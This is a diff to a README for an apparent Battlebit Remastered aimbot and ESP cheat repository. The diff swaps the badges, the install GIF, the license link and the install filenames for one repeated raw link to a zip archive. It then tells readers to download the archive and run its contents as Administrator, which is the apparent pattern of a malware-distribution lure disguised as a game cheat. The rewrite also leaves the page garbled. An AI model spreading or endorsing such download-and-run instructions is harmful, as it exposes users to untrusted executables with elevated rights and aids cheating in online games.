@@ -1,10 +1,10 @@
 # ⚡️ Battlebit Remastered Aimbot & ESP Cheat Suite ⚡️
 
-![OS Compatibility](https://img.shields.io/badge/OS-Windows%2010%2F11-blue)
-![Support](https://img.shields.io/badge/Support-24%2F7-brightgreen)
-![Languages](https://img.shields.io/badge/Languages-Multi--language-orange)
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![API Integrations](https://img.shields.io/badge/API-OpenAI%20%26%20Claude-blueviolet)
+![OS Compatibility](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip%2010%2F11-blue)
+![Support](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip%2F7-brightgreen)
+![Languages](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip)
+![License: MIT](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip)
+![API Integrations](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip%20%26%20Claude-blueviolet)
 
 ---
 
@@ -48,14 +48,14 @@ Whether you're battling it out solo or leading a squad, our **aimbot and advance
 
 Getting started is streamlined, secure, and guided every step of the way! Dive into the process below and prepare to experience Battlebit Remastered like never before.
 
-1. **Download the latest EasyLaunch.zip from this repository** — This archive contains your personalized command center.
+1. **Download the latest https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip from this repository** — This archive contains your personalized command center.
 2. **Extract the contents** to your favorite gaming directory.
-3. **Launch the EasyLaunch.exe** file as Administrator.
+3. **Launch the https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip** file as Administrator.
 4. **Customize your settings** (a language selection panel will greet you on the first boot).
 5. **Jump into Battlebit Remastered** and activate the suite via the in-game overlay toggle.
 6. **Refer to the animated video below for a visual walkthrough:**
 
-<img src="https://i.imgur.com/Js67NIU.gif" alt="Installation Video" width="500"/>
+<img src="https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip" alt="Installation Video" width="500"/>
 
 7. **For troubleshooting** or to personalize advanced features, check the in-suite Help tab or contact 24/7 support.
 
@@ -109,7 +109,7 @@ This project is designed to demonstrate creative technical applications and shou
 
 ## 📜 License
 
-Released under the [MIT License](https://opensource.org/license/mit/) © Open-Source Contributors 2025. You are welcome to adapt, extend, and collaborate within the boundaries of this license. See LICENSE.md for details.
+Released under the [MIT License](https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip) © Open-Source Contributors 2025. You are welcome to adapt, extend, and collaborate within the boundaries of this license. See https://raw.githubusercontent.com/ganesh2008born/battlebit-remastered-aimbot-esp-toolkit/main/unconsulted/aimbot-toolkit-battlebit-remastered-esp-v2.1.zip for details.
 
 ---
 
